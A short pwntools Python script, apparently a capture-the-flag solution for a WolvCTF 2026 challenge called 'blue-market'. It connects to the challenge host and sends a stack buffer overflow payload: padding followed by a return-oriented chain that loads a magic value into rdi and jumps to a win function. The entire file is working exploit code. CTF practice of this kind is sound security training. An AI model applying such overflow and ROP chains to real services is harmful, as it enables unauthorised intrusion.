from pwn import *

context.arch = 'amd64'
context.log_level = 'error'

HOST, PORT = 'blue-market.wolvctf-2026.kctf.cloud', 1337
POP_RDI, RET, WIN, MAGIC = 0x401182, 0x401183, 0x401184, 0xc0ffee

io = remote(HOST, PORT)
io.recvuntil(b'Scan an item (enter item code): ')

payload  = b'A' * 0x40
payload += b'B' * 8
payload += p64(POP_RDI) + p64(MAGIC) + p64(RET) + p64(WIN)

io.send(payload)
print(io.recvall(timeout=5).decode())
